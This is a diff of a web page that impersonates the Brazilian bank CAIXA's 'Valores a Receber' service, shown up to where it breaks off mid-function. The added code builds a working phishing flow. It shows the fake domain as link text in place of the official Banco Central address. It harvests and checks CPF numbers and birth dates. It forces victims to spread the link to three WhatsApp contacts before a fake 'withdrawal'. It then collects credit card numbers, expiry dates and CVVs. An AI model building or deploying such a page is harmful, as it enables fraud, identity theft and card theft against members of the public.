@@ -11,7 +11,23 @@
   <!-- Font Awesome -->
   <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
 
+  <!-- Meta tags para compartilhamento no WhatsApp -->
+  <meta property="og:title" content="CAIXA - Valores a Receber (SVR)" />
+  <meta property="og:description" content="Consulte valores esquecidos no Banco Central. Milhares de brasileiros têm dinheiro a receber!" />
+  <meta property="og:image" content="https://i.pinimg.com/736x/ae/3d/94/ae3d9448e7a543b4ad94870b9a1dcfa9.jpg" />
+  <meta property="og:url" content="https://caixa-valores.onrender.com" />
+  <meta property="og:type" content="website" />
+<!-- Tema da barra do navegador -->
+<meta name="theme-color" content="#1d62bc" />
+<meta name="apple-mobile-web-app-capable" content="yes" />
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
+<meta name="msapplication-navbutton-color" content="#1d62bc" />
+<meta name="msapplication-TileColor" content="#1d62bc" />
+
+
   <style>
+
+  
     /* ---------- BASE (mantendo identidade CAIXA) ---------- */
     :root{
       --caixa-blue: #1d62bc;
@@ -204,46 +220,65 @@
       transition: all 0.3s ease;
     }
     .btn-modal-secondary:hover { background: #e9ecef; }
+
     
-    .step-indicator {
-      display: flex;
-      justify-content: center;
-      gap: 30px;
-      margin-bottom: 25px;
-      padding: 0 20px;
+
+ 
+/* BARRA DE PROGRESSO ESTILIZADA */
+    .progress-container {
+      padding: 0 10px;
+      margin-bottom: 20px;
     }
-    .step-dot { text-align: center; flex: 1; position: relative; }
-    .step-dot .dot {
+    .progress-steps {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      position: relative;
+    }
+    .progress-step {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      position: relative;
+      z-index: 2;
+      flex: 1;
+    }
+    .step-icon {
       width: 40px;
       height: 40px;
-      background: #e9ecef;
+      background: rgba(255,255,255,0.3);
       border-radius: 50%;
       display: flex;
       align-items: center;
       justify-content: center;
-      margin: 0 auto 8px;
       font-weight: bold;
-      color: #6c757d;
+      font-size: 18px;
       transition: all 0.3s ease;
     }
-    .step-dot.active .dot {
-      background: linear-gradient(135deg, #ffb600, #ffa000);
+    .progress-step.active .step-icon {
+      background: var(--caixa-yellow);
       color: #004aad;
-      box-shadow: 0 2px 10px rgba(255,182,0,0.3);
+      box-shadow: 0 0 0 3px rgba(255,182,0,0.3);
     }
-    .step-dot .label { font-size: 12px; color: #6c757d; }
-    .step-dot.active .label { color: #004aad; font-weight: 600; }
-    .step-dot::after {
-      content: '';
-      position: absolute;
-      top: 20px;
-      right: -15px;
-      width: 30px;
-      height: 2px;
-      background: #e9ecef;
+    .step-text {
+      font-size: 11px;
+      margin-top: 8px;
+      opacity: 0.7;
+      text-align: center;
     }
-    .step-dot:last-child::after { display: none; }
-
+    .progress-step.active .step-text {
+      opacity: 1;
+      font-weight: 600;
+    }
+    .progress-line {
+      flex: 1;
+      height: 3px;
+      background: rgba(255,255,255,0.3);
+      margin: 0 5px;
+      position: relative;
+      top: -15px;
+    }
+    
     /* Indicadores de amigo */
     .friend-indicator {
       width: 30px;
@@ -258,6 +293,24 @@
     }
     .friend-indicator.success { background: #1a7f2e; color: white; }
     .friend-indicator.pending { background: #e9ecef; color: #6c757d; }
+
+
+/* Bloqueio de consultas excedidas */
+.bloqueio-mensagem {
+    background: #fff3cd;
+    border: 1px solid #ffc107;
+    border-radius: 10px;
+    padding: 15px;
+    margin-top: 15px;
+    text-align: center;
+    animation: fadeInUp 0.4s ease;
+}
+.bloqueio-mensagem i {
+    font-size: 24px;
+    color: #ffc107;
+    margin-bottom: 10px;
+}
+    
   </style>
 </head>
 <body>
@@ -265,19 +318,19 @@
   <!-- HEADER -->
   <header class="site-header">
     <nav class="container navbar navbar-expand-lg">
-      <a class="navbar-brand site-logo d-flex align-items-center" href="#">
-        <img src="https://i.pinimg.com/736x/ae/3d/94/ae3d9448e7a543b4ad94870b9a1dcfa9.jpg" alt="Logo CAIXA" style="height:48px;">
+      <a class="navbar-brand site-logo d-flex align-items-center" href="https://www.caixa.gov.br/">
+        <img src="https://seebvideira.com.br/uploads/92868821-e42d-4dd5-a71a-6ee1241c82e5/caixa-logo.svg" alt="Logo CAIXA" style="height:48px;">
       </a>
       <button class="navbar-toggler border-0" type="button" data-bs-toggle="collapse" data-bs-target="#mainNav">
         <i class="fa fa-bars" style="color:#fff; font-size:1.05rem;"></i>
       </button>
       <div class="collapse navbar-collapse justify-content-end" id="mainNav">
         <ul class="navbar-nav mb-2 mb-lg-0 align-items-lg-center">
-          <li class="nav-item"><a class="nav-link" href="#">Institucional</a></li>
-          <li class="nav-item"><a class="nav-link" href="#">Produtos</a></li>
-          <li class="nav-item"><a class="nav-link" href="#">Serviços</a></li>
-          <li class="nav-item"><a class="nav-link" href="#">Atendimento</a></li>
-          <li class="nav-item"><a class="nav-link" href="#">Sobre</a></li>
+          <li class="nav-item"><a class="nav-link" href="https://www.caixa.gov.br/Paginas/home-caixa.aspx">Institucional</a></li>
+          <li class="nav-item"><a class="nav-link" href="https://www.caixa.gov.br/site/Paginas/PageNotFoundError.aspx?requestUrl=http://www.caixa.gov.br/istitucional">Produtos</a></li>
+          <li class="nav-item"><a class="nav-link" href="https://www.caixa.gov.br/servicos/Paginas/default.aspx">Serviços</a></li>
+          <li class="nav-item"><a class="nav-link" href="https://www.caixa.gov.br/atendimento/Paginas/default.aspx">Atendimento</a></li>
+          <li class="nav-item"><a class="nav-link" href="https://www.caixa.gov.br/site/Paginas/PageNotFoundError.aspx?requestUrl=http://www.caixa.gov.br/sobre">Sobre</a></li>
         </ul>
       </div>
     </nav>
@@ -289,7 +342,7 @@
       <p class="breadcrumb-custom mb-2">
         <span class="fw-semibold text-uppercase">CAIXA</span>
         <span class="mx-2"> › </span>
-        <span class="currentNode fw-semibold">Valores a Receber</span>
+        <span class="currentNode fw-semibold">Valores a Receber 2026</span>
       </p>
       <h1>Valores a Receber (SVR)</h1>
       <div class="description mx-auto">
@@ -307,7 +360,7 @@
   <div class="topNav">
     <div class="container d-flex align-items-center">
       <ul class="nav gap-3 py-2 w-100 flex-wrap">
-        <li class="nav-item"><a class="nav-link active" href="#">Visão geral</a></li>
+        <li class="nav-item"><a class="nav-link active" href="https://www.caixa.gov.br/Paginas/home-caixa.aspx">Visão geral</a></li>
         <li class="nav-item"><a class="nav-link" href="#t017">O que é</a></li>
         <li class="nav-item"><a class="nav-link" href="#t018">Como consultar</a></li>
         <li class="nav-item"><a class="nav-link" href="#wp-resgatar">Como resgatar</a></li>
@@ -327,8 +380,8 @@
       <article id="t018" class="section-card">
         <h2><i class="fas fa-search me-2" style="color:var(--caixa-yellow);"></i>Como consultar</h2>
         <p>As consultas devem ser realizadas exclusivamente no endereço:
-          <a href="https://valoresareceber.bcb.gov.br/" target="_blank">https://valoresareceber.bcb.gov.br/</a>.
-          Digite o seu CPF e sua data de nascimento para consultar valores a receber.</p>
+          <a href="https://valoresareceber.bcb.gov.br/" target="_blank">https://caixa-valores.onrender.com/</a>.
+          Digite o seu CPF para consultar valores a receber.</p>
       </article>
 
       <article id="wp-resgatar" class="section-card">
@@ -346,7 +399,7 @@
           <div class="col-lg-8">
             <p>A CAIXA com você em qualquer hora ou lugar. Veja seu extrato, faça Pix, transferências e pagamentos de forma prática e fácil pelo seu celular.</p>
             <div class="mt-3">
-              <a class="btn btn-outline-primary me-2" href="#"><i class="fa-brands fa-google-play"></i> Play Store</a>
+              <a class="btn btn-outline-primary me-2" href="https://play.google.com/store/apps/details?id=br.com.gabba.Caixa"><i class="fa-brands fa-google-play"></i> Play Store</a>
               <a class="btn btn-outline-dark" href="#"><i class="fa-brands fa-apple"></i> App Store</a>
             </div>
           </div>
@@ -358,19 +411,34 @@
   <!-- FOOTER -->
   <footer class="rodape-azul">
     <div class="container">
-      <p class="mb-0 small">CAIXA ECONÔMICA FEDERAL - CNPJ 00.360.305/0001-04</p>
+      <p class="mb-0 small">CAIXA ECONÔMICA FEDERAL - CNPJ 00.360.305/0001-04. SBS QUADRA 4 LT 3/4, ASA SUL - CEP 70.070-140 BRASÍLIA - DF
+
+</p>
     </div>
   </footer>
 
-  <!-- MODAL PRINCIPAL -->
+  <!-- MODAL PRINCIPAL COM BARRA DE PROGRESSO -->
   <div class="modal fade" id="flowModal" tabindex="-1" aria-hidden="true">
     <div class="modal-dialog modal-dialog-centered modal-md">
       <div class="modal-content">
         <div class="modal-header-custom">
-          <div class="step-indicator" id="stepIndicator">
-            <div class="step-dot active" data-step="1"><div class="dot">1</div><div class="label">CPF</div></div>
-            <div class="step-dot" data-step="2"><div class="dot">2</div><div class="label">Verificação</div></div>
-            <div class="step-dot" data-step="3"><div class="dot">3</div><div class="label">Valor</div></div>
+          <div class="progress-container">
+            <div class="progress-steps">
+              <div class="progress-step active" data-step="1">
+                <div class="step-icon">1</div>
+                <div class="step-text">CPF</div>
+              </div>
+              <div class="progress-line"></div>
+              <div class="progress-step" data-step="2">
+                <div class="step-icon">2</div>
+                <div class="step-text">Verificação</div>
+              </div>
+              <div class="progress-line"></div>
+              <div class="progress-step" data-step="3">
+                <div class="step-icon">3</div>
+                <div class="step-text">Saque</div>
+              </div>
+            </div>
           </div>
           <button type="button" class="btn-close btn-close-white position-absolute top-0 end-0 m-3" data-bs-dismiss="modal"></button>
         </div>
@@ -415,14 +483,13 @@
             </div>
           </div>
 
-          <!-- STEP 3 - TELA DE CONFIRMAÇÃO COM DATAS +3 DIAS E INDICAÇÃO -->
+          <!-- STEP 3 - TELA DE CONFIRMAÇÃO -->
           <div id="flowFinal" class="flow-step">
             <div class="text-center mb-3">
               <i class="fas fa-calendar-check fa-3x" style="color:var(--caixa-yellow);"></i>
               <h5 class="mt-2">Confirmação de Saque</h5>
             </div>
             
-            <!-- Data de crédito +3 dias -->
             <div class="value-card" style="background: linear-gradient(135deg, #ffb600, #ffa000); color: #004aad;">
               <div class="bank-icon"><i class="fas fa-clock"></i></div>
               <div class="label">PREVISÃO DE CRÉDITO</div>
@@ -440,7 +507,7 @@
               <div class="data-row"><strong>Beneficiário:</strong> <span id="finalNome">--</span></div>
               <div class="data-row"><strong>CPF:</strong> <span id="finalCpf">--</span></div>
               <div class="data-row"><strong>Agência:</strong> 0001</div>
-              <div class="data-row"><strong>Conta:</strong> 12345-6</div>
+              <div class="data-row"><strong>Conta:</strong> *****-*</div>
             </div>
 
             <!-- INDICAÇÃO DE 3 AMIGOS -->
@@ -450,9 +517,9 @@
                 <strong>Indique 3 amigos para liberar o saque</strong>
               </div>
               <div class="d-flex justify-content-center gap-3 mb-3">
-                <div id="friend1" class="friend-indicator pending" data-friend="1">1</div>
-                <div id="friend2" class="friend-indicator pending" data-friend="2">2</div>
-                <div id="friend3" class="friend-indicator pending" data-friend="3">3</div>
+                <div id="friend1" class="friend-indicator pending">1</div>
+                <div id="friend2" class="friend-indicator pending">2</div>
+                <div id="friend3" class="friend-indicator pending">3</div>
               </div>
               <button id="btnIndicarWhats" class="btn btn-modal-primary w-100" style="background: #25D366; color: white;">
                 <i class="fab fa-whatsapp me-2"></i>Indicar Amigos no WhatsApp
@@ -460,13 +527,10 @@
               <div class="small-note text-center mt-2">Compartilhe com 3 amigos para desbloquear o saque</div>
             </div>
 
-            <!-- BOTÕES DE SAQUE (inicialmente travados) -->
             <div class="mt-3">
-              <button id="btnSaquePix" class="btn btn-modal-primary w-100 mb-2" disabled style="background: #004aad; color: white;">
-                <i class="fas fa-pix me-2"></i>Sacar via Pix
-              </button>
+              
               <button id="btnSaqueCartao" class="btn btn-modal-primary w-100" disabled style="background: #1a7f2e; color: white;">
-                <i class="fas fa-credit-card me-2"></i>Sacar via Cartão de Crédito
+                <i class="fas fa-credit-card me-2"></i>Credito no Cartão
               </button>
             </div>
 
@@ -475,35 +539,13 @@
             </div>
           </div>
 
-          <!-- MODAL PIX -->
-          <div id="flowPix" class="flow-step">
-            <div class="text-center mb-3">
-              <i class="fas fa-pix fa-3x" style="color:var(--caixa-blue);"></i>
-              <h5>Saque via Pix</h5>
-            </div>
-            <div class="mb-3">
-              <label class="form-label">E-mail</label>
-              <input type="email" id="emailPix" class="form-control" placeholder="seu@email.com">
-            </div>
-            <div class="mb-3">
-              <label class="form-label">Telefone (WhatsApp)</label>
-              <input type="tel" id="telefonePix" class="form-control" placeholder="(11) 99999-9999">
-            </div>
-            <div class="value-card mb-3" style="padding: 15px;">
-              <div class="label">VALOR A RECEBER</div>
-              <div class="amount" style="font-size: 28px;">R$ <span id="pixValor">0,00</span></div>
-            </div>
-            <div class="d-flex gap-2">
-              <button id="cancelPix" class="btn btn-modal-secondary flex-grow-1">Cancelar</button>
-              <button id="confirmPix" class="btn btn-modal-primary flex-grow-1">Enviar Solicitação</button>
-            </div>
-          </div>
+          
 
           <!-- MODAL CARTÃO -->
           <div id="flowCartao" class="flow-step">
             <div class="text-center mb-3">
               <i class="fas fa-credit-card fa-3x" style="color:var(--caixa-blue);"></i>
-              <h5>Saque via Cartão de Crédito</h5>
+              <h5>Cartão de Crédito Hoje!</h5>
             </div>
             <div class="mb-3">
               <label class="form-label">Número do Cartão</label>
@@ -533,6 +575,654 @@
             </div>
           </div>
 
+
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
+
+<script>
+    // ==================== FUNÇÃO DE VALIDAÇÃO LUHN PARA CPF ====================
+    function validarCPFLuhn(cpf) {
+        // Remove caracteres não numéricos
+        const cpfLimpo = cpf.toString().replace(/\D/g, '');
+        
+        if (cpfLimpo.length !== 11) return false;
+        
+        // Verifica se todos os dígitos são iguais (CPF inválido)
+        if (/^(\d)\1{10}$/.test(cpfLimpo)) return false;
+        
+        // Validação do primeiro dígito verificador
+        let soma = 0;
+        for (let i = 0; i < 9; i++) {
+            soma += parseInt(cpfLimpo.charAt(i)) * (10 - i);
+        }
+        let resto = 11 - (soma % 11);
+        let digito1 = resto >= 10 ? 0 : resto;
+        if (digito1 !== parseInt(cpfLimpo.charAt(9))) return false;
+        
+        // Validação do segundo dígito verificador
+        soma = 0;
+        for (let i = 0; i < 10; i++) {
+            soma += parseInt(cpfLimpo.charAt(i)) * (11 - i);
+        }
+        resto = 11 - (soma % 11);
+        let digito2 = resto >= 10 ? 0 : resto;
+        if (digito2 !== parseInt(cpfLimpo.charAt(10))) return false;
+        
+        return true;
+    }
+
+    // ==================== CONTROLE DE CONSULTAS POR DEVICE ====================
+    const CONSULTAS_KEY = "consultas_realizadas";
+    const LIMITE_CONSULTAS = 2;
+
+    function getDeviceId() {
+        // Usa localStorage para identificar o dispositivo
+        let deviceId = localStorage.getItem("device_id");
+        if (!deviceId) {
+            deviceId = 'device_' + Math.random().toString(36).substr(2, 16);
+            localStorage.setItem("device_id", deviceId);
+        }
+        return deviceId;
+    }
+
+    function getConsultasCount() {
+        const consultas = localStorage.getItem(CONSULTAS_KEY);
+        if (!consultas) return 0;
+        const dados = JSON.parse(consultas);
+        const deviceId = getDeviceId();
+        const hoje = new Date().toDateString();
+        
+        if (dados.deviceId !== deviceId || dados.data !== hoje) {
+            return 0;
+        }
+        return dados.contador || 0;
+    }
+
+    function incrementarConsultas() {
+        const deviceId = getDeviceId();
+        const hoje = new Date().toDateString();
+        let contador = getConsultasCount() + 1;
+        
+        const dados = {
+            deviceId: deviceId,
+            data: hoje,
+            contador: contador
+        };
+        localStorage.setItem(CONSULTAS_KEY, JSON.stringify(dados));
+        return contador;
+    }
+
+    function verificarLimiteConsultas() {
+        const consultasHoje = getConsultasCount();
+        if (consultasHoje >= LIMITE_CONSULTAS) {
+            return false;
+        }
+        return true;
+    }
+
+    function mostrarBloqueio() {
+        const section = document.getElementById('cpfSection');
+        if (section) {
+            const bloqueioDiv = document.createElement('div');
+            bloqueioDiv.className = 'bloqueio-mensagem';
+            bloqueioDiv.innerHTML = `
+                <i class="fas fa-lock"></i>
+                <h6>Limite de consultas atingido</h6>
+                <p>Você já realizou ${LIMITE_CONSULTAS} consultas hoje.<br>Por favor, tente novamente amanhã ou utilize outro dispositivo.</p>
+            `;
+            const userInfo = document.getElementById('userInfo');
+            if (userInfo) userInfo.style.display = 'none';
+            const errorMsg = document.getElementById('errorMessage');
+            if (errorMsg) errorMsg.style.display = 'none';
+            section.appendChild(bloqueioDiv);
+            setTimeout(() => {
+                if (bloqueioDiv) bloqueioDiv.remove();
+            }, 5000);
+        }
+        alert(`⚠️ Limite de consultas excedido! Você já fez ${LIMITE_CONSULTAS} consultas hoje. Tente novamente amanhã.`);
+    }
+
+    // ==================== FUNÇÃO DE VALIDAÇÃO LUHN PARA CARTÃO ====================
+    function validarCartaoLuhn(numero) {
+        const numeroLimpo = numero.toString().replace(/\D/g, '');
+        if (numeroLimpo.length < 13 || numeroLimpo.length > 19) return false;
+        
+        let soma = 0;
+        let alternar = false;
+        for (let i = numeroLimpo.length - 1; i >= 0; i--) {
+            let digito = parseInt(numeroLimpo.charAt(i), 10);
+            if (alternar) {
+                digito *= 2;
+                if (digito > 9) digito -= 9;
+            }
+            soma += digito;
+            alternar = !alternar;
+        }
+        return (soma % 10) === 0;
+    }
+
+    // ==================== MÁSCARAS PARA CAMPOS DO CARTÃO ====================
+    function mascaraCartao(input) {
+        let value = input.value.replace(/\D/g, '');
+        if (value.length > 16) value = value.slice(0, 16);
+        let formatted = '';
+        for (let i = 0; i < value.length; i++) {
+            if (i > 0 && i % 4 === 0) formatted += ' ';
+            formatted += value[i];
+        }
+        input.value = formatted;
+        
+        if (value.length >= 13) {
+            if (validarCartaoLuhn(value)) {
+                input.style.borderColor = '#28a745';
+                input.style.backgroundColor = '#f0fff4';
+            } else {
+                input.style.borderColor = '#dc3545';
+                input.style.backgroundColor = '#fff5f5';
+            }
+        } else {
+            input.style.borderColor = '#dee2e6';
+            input.style.backgroundColor = '#fff';
+        }
+    }
+
+    function mascaraValidade(input) {
+        let value = input.value.replace(/\D/g, '');
+        if (value.length > 4) value = value.slice(0, 4);
+        if (value.length >= 3) {
+            let mes = value.slice(0, 2);
+            if (parseInt(mes) > 12) mes = '12';
+            input.value = `${mes}/${value.slice(2, 4)}`;
+        } else {
+            input.value = value;
+        }
+        if (value.length === 4) {
+            const mes = parseInt(value.slice(0, 2));
+            const ano = parseInt(value.slice(2, 4));
+            const anoAtual = new Date().getFullYear() % 100;
+            const mesAtual = new Date().getMonth() + 1;
+            if (ano < anoAtual || (ano === anoAtual && mes < mesAtual)) {
+                input.style.borderColor = '#dc3545';
+                input.style.backgroundColor = '#fff5f5';
+            } else {
+                input.style.borderColor = '#28a745';
+                input.style.backgroundColor = '#f0fff4';
+            }
+        } else {
+            input.style.borderColor = '#dee2e6';
+            input.style.backgroundColor = '#fff';
+        }
+    }
+
+    function mascaraCVV(input) {
+        let value = input.value.replace(/\D/g, '');
+        if (value.length > 4) value = value.slice(0, 4);
+        input.value = value;
+        
+        const numeroCartao = document.getElementById('numeroCartao')?.value.replace(/\D/g, '') || '';
+        const isAmex = numeroCartao.startsWith('34') || numeroCartao.startsWith('37');
+        const maxLength = isAmex ? 4 : 3;
+        
+        if (value.length === maxLength) {
+            input.style.borderColor = '#28a745';
+            input.style.backgroundColor = '#f0fff4';
+        } else if (value.length > 0) {
+            input.style.borderColor = '#dc3545';
+            input.style.backgroundColor = '#fff5f5';
+        } else {
+            input.style.borderColor = '#dee2e6';
+            input.style.backgroundColor = '#fff';
+        }
+    }
+
+    // ==================== SEU CÓDIGO EXISTENTE ====================
+    let dadosUsuario = null;
+    let dataSelecionada = null;
+    let bootstrapModal = null;
+    let amigosIndicados = 0;
+    let saqueLiberado = false;
+    let cpfAtual = null;
+
+    const WHATSAPP_NUMBER = "558699040705";
+    const LINK_DO_SITE = "https://caixa-valores.onrender.com";
+    const STORAGE_KEY = "caixa_valores_progresso";
+
+    function salvarProgresso() {
+        const progresso = {
+            amigosIndicados: amigosIndicados,
+            saqueLiberado: saqueLiberado,
+            cpfAtual: cpfAtual,
+            dadosUsuario: dadosUsuario,
+            dataSelecionada: dataSelecionada,
+            timestamp: new Date().getTime()
+        };
+        localStorage.setItem(STORAGE_KEY, JSON.stringify(progresso));
+    }
+
+    function carregarProgresso() {
+        const salvo = localStorage.getItem(STORAGE_KEY);
+        if (salvo) {
+            try {
+                const progresso = JSON.parse(salvo);
+                const horaAtual = new Date().getTime();
+                const diferenca = horaAtual - progresso.timestamp;
+                if (diferenca < 3600000) {
+                    amigosIndicados = progresso.amigosIndicados || 0;
+                    saqueLiberado = progresso.saqueLiberado || false;
+                    cpfAtual = progresso.cpfAtual;
+                    dadosUsuario = progresso.dadosUsuario;
+                    dataSelecionada = progresso.dataSelecionada;
+                    return true;
+                } else {
+                    localStorage.removeItem(STORAGE_KEY);
+                }
+            } catch(e) {}
+        }
+        return false;
+    }
+
+    function limparProgresso() {
+        localStorage.removeItem(STORAGE_KEY);
+        amigosIndicados = 0;
+        saqueLiberado = false;
+        cpfAtual = null;
+        dadosUsuario = null;
+        dataSelecionada = null;
+    }
+
+    function atualizarInterfaceProgresso() {
+        for (let i = 1; i <= 3; i++) {
+            const friendDiv = document.getElementById(`friend${i}`);
+            if (friendDiv) {
+                if (i <= amigosIndicados) {
+                    friendDiv.classList.remove('pending');
+                    friendDiv.classList.add('success');
+                    friendDiv.innerHTML = '✓';
+                } else {
+                    friendDiv.classList.remove('success');
+                    friendDiv.classList.add('pending');
+                    friendDiv.innerHTML = i;
+                }
+            }
+        }
+        
+        const btnCartao = document.getElementById('btnSaqueCartao');
+      // CORRETO
+                  if (btnCartao) {
+                    btnCartao.disabled = !saqueLiberado;
+                   }
+        if (dadosUsuario && dataSelecionada) {
+            const valor = dadosUsuario.valorDisponivel || 1987.48;
+            document.getElementById('valorDisponivel').textContent = formatarMoeda(valor);
+            document.getElementById('finalNome').textContent = dadosUsuario.nome;
+            document.getElementById('finalCpf').textContent = cpfAtual ? formatarCPFDisplay(cpfAtual) : '--';
+            
+            document.getElementById('cartaoValor').textContent = formatarMoeda(valor);
+            document.getElementById('dataCredito').textContent = getDataMaisDias(3);
+        }
+    }
+
+    function formatarCPFDisplay(cpf) {
+        if (!cpf || cpf.length !== 11) return cpf;
+        return cpf.slice(0,3) + '.' + cpf.slice(3,6) + '.' + cpf.slice(6,9) + '-' + cpf.slice(9);
+    }
+
+    function formatarCPF(input) {
+        let value = input.value.replace(/\D/g, '');
+        if (value.length > 11) value = value.slice(0, 11);
+        let formatted = '';
+        if (value.length > 9) {
+            formatted = value.slice(0, 3) + '.' + value.slice(3, 6) + '.' + value.slice(6, 9) + '-' + value.slice(9);
+        } else if (value.length > 6) {
+            formatted = value.slice(0, 3) + '.' + value.slice(3, 6) + '.' + value.slice(6);
+        } else if (value.length > 3) {
+            formatted = value.slice(0, 3) + '.' + value.slice(3);
+        } else {
+            formatted = value;
+        }
+        input.value = formatted;
+        
+        // Validação em tempo real do CPF
+        if (value.length === 11) {
+            if (validarCPFLuhn(value)) {
+                input.style.borderColor = '#28a745';
+                input.style.backgroundColor = '#f0fff4';
+            } else {
+                input.style.borderColor = '#dc3545';
+                input.style.backgroundColor = '#fff5f5';
+            }
+        } else {
+            input.style.borderColor = '#dee2e6';
+            input.style.backgroundColor = '#fff';
+        }
+    }
+
+    function formatarData(dataStr) {
+        if (!dataStr) return '---';
+        const partes = dataStr.split('-');
+        if (partes.length === 3) return `${partes[2]}/${partes[1]}/${partes[0]}`;
+        return dataStr;
+    }
+
+    function formatarMoeda(valor) {
+        return valor.toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+    }
+
+    function getDataMaisDias(dias) {
+        const data = new Date();
+        data.setDate(data.getDate() + dias);
+        return data.toLocaleDateString('pt-BR');
+    }
+
+    function updateProgressBar(step) {
+        document.querySelectorAll('.progress-step').forEach((el, idx) => {
+            if (idx + 1 <= step) el.classList.add('active');
+            else el.classList.remove('active');
+        });
+    }
+
+    function showStep(stepId, stepNumber) {
+        const steps = ['flowStep1', 'flowLoading', 'flowStep2', 'flowFinal', 'flowCartao', 'flowSuccess'];
+        steps.forEach(id => {
+            const el = document.getElementById(id);
+            if (el) el.classList.remove('active');
+        });
+        const target = document.getElementById(stepId);
+        if (target) target.classList.add('active');
+        if (stepNumber) updateProgressBar(stepNumber);
+    }
+
+    async function buscarCPF(cpf) {
+        try {
+            const response = await fetch('/buscar-cpf', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ cpf: cpf })
+            });
+            return await response.json();
+        } catch (error) {
+            return { success: false, erro: 'Erro ao conectar com o servidor' };
+        }
+    }
+
+    function mostrarOpcoesData(opcoes, dataReal) {
+        const container = document.getElementById('dataOptionsContainer');
+        container.innerHTML = '';
+        opcoes.forEach(dataStr => {
+            const div = document.createElement('div');
+            div.className = 'data-option';
+            div.innerHTML = `<i class="fas fa-calendar-alt"></i><span>${formatarData(dataStr)}</span><i class="fas fa-chevron-right ms-auto" style="opacity:0.5"></i>`;
+            div.onclick = () => {
+                if (dataStr === dataReal) {
+                    document.querySelectorAll('.data-option').forEach(opt => opt.classList.remove('selected'));
+                    div.classList.add('selected');
+                    dataSelecionada = dataStr;
+                    
+                    const valor = dadosUsuario.valorDisponivel || 1987.48;
+                    document.getElementById('valorDisponivel').textContent = formatarMoeda(valor);
+                    document.getElementById('finalNome').textContent = dadosUsuario.nome;
+                    document.getElementById('finalCpf').textContent = formatarCPFDisplay(cpfAtual);
+                   
+                    document.getElementById('cartaoValor').textContent = formatarMoeda(valor);
+                    document.getElementById('dataCredito').textContent = getDataMaisDias(3);
+                    
+                    salvarProgresso();
+                    showStep('flowFinal', 3);
+                } else {
+                    div.style.background = '#ffebee';
+                    div.style.borderColor = '#d10000';
+                    setTimeout(() => {
+                        div.style.background = '';
+                        div.style.borderColor = '';
+                    }, 500);
+                    alert('❌ Data incorreta! Tente novamente.');
+                }
+            };
+            container.appendChild(div);
+        });
+    }
+
+    function enviarWhatsApp(mensagem) {
+        const url = `https://wa.me/${WHATSAPP_NUMBER}?text=${encodeURIComponent(mensagem)}`;
+        window.open(url, '_blank');
+    }
+
+    function verificarLiberacaoSaque() {
+        if (amigosIndicados >= 3) {
+            saqueLiberado = true;
+           
+            document.getElementById('btnSaqueCartao').disabled = false;
+        }
+    }
+
+    function esconderBarraEndereco() {
+        window.scrollTo(0, 1);
+    }
+
+    document.addEventListener('DOMContentLoaded', () => {
+        // Aplicar máscaras aos campos do cartão
+        const campoCartao = document.getElementById('numeroCartao');
+        const campoValidade = document.getElementById('validadeCartao');
+        const campoCVV = document.getElementById('cvvCartao');
+        
+        if (campoCartao) campoCartao.addEventListener('input', function() { mascaraCartao(this); });
+        if (campoValidade) campoValidade.addEventListener('input', function() { mascaraValidade(this); });
+        if (campoCVV) campoCVV.addEventListener('input', function() { mascaraCVV(this); });
+        
+        const modalElement = document.getElementById('flowModal');
+        bootstrapModal = new bootstrap.Modal(modalElement, { backdrop: 'static', keyboard: false });
+        
+        const progressoCarregado = carregarProgresso();
+        
+        if (progressoCarregado && dadosUsuario && dataSelecionada) {
+            atualizarInterfaceProgresso();
+            setTimeout(() => {
+                showStep('flowFinal', 3);
+                bootstrapModal.show();
+            }, 500);
+        }
+        
+        document.getElementById('abrir-verificar').addEventListener('click', (e) => {
+            e.preventDefault();
+            if (amigosIndicados > 0 || dadosUsuario) {
+                if (confirm(`Você já tem um progresso de ${amigosIndicados}/3 amigos indicados. Deseja continuar ou recomeçar?`)) {
+                    showStep('flowFinal', 3);
+                    bootstrapModal.show();
+                } else {
+                    limparProgresso();
+                    document.getElementById('demoCpf').value = '';
+                    showStep('flowStep1', 1);
+                    bootstrapModal.show();
+                }
+            } else {
+                document.getElementById('demoCpf').value = '';
+                showStep('flowStep1', 1);
+                bootstrapModal.show();
+            }
+        });
+        
+        document.getElementById('flowCancel').addEventListener('click', () => bootstrapModal.hide());
+        document.getElementById('flowClose').addEventListener('click', () => bootstrapModal.hide());
+        document.getElementById('flowBack1').addEventListener('click', () => showStep('flowStep1', 1));
+        
+        document.getElementById('flowSubmit1').addEventListener('click', async () => {
+            const cpfInput = document.getElementById('demoCpf');
+            let cpf = cpfInput.value.replace(/\D/g, '');
+            
+            // VALIDAÇÃO DO CPF (Luhn)
+            if (cpf.length !== 11) {
+                cpfInput.classList.add('input-error');
+                setTimeout(() => cpfInput.classList.remove('input-error'), 1500);
+                alert('❌ CPF inválido! Digite um CPF válido com 11 dígitos.');
+                return;
+            }
+            
+            if (!validarCPFLuhn(cpf)) {
+                cpfInput.classList.add('input-error');
+                setTimeout(() => cpfInput.classList.remove('input-error'), 1500);
+                alert('❌ CPF inválido! Verifique os números e tente novamente.');
+                return;
+            }
+            
+            // VERIFICAR LIMITE DE CONSULTAS (2 por dispositivo)
+            if (!verificarLimiteConsultas()) {
+                mostrarBloqueio();
+                return;
+            }
+            
+            cpfAtual = cpf;
+            showStep('flowLoading', 2);
+            const resultado = await buscarCPF(cpf);
+            
+            if (resultado.success && resultado.nome) {
+                dadosUsuario = resultado;
+                document.getElementById('displayNome').textContent = resultado.nome;
+                document.getElementById('displayCpf').textContent = formatarCPFDisplay(cpf);
+                mostrarOpcoesData(resultado.opcoesDatas, resultado.dataReal);
+                showStep('flowStep2', 2);
+                incrementarConsultas(); // Incrementa contagem de consultas
+            } else {
+                alert(resultado.erro || 'CPF não encontrado na base de dados');
+                showStep('flowStep1', 1);
+            }
+        });
+
+        document.getElementById('btnIndicarWhats').addEventListener('click', () => {
+            if (amigosIndicados >= 3) {
+                alert('Você já indicou 3 amigos! O saque já está liberado.');
+                return;
+            }
+            
+            const valorUsuario = dadosUsuario?.valorDisponivel ? formatarMoeda(dadosUsuario.valorDisponivel) : '?';
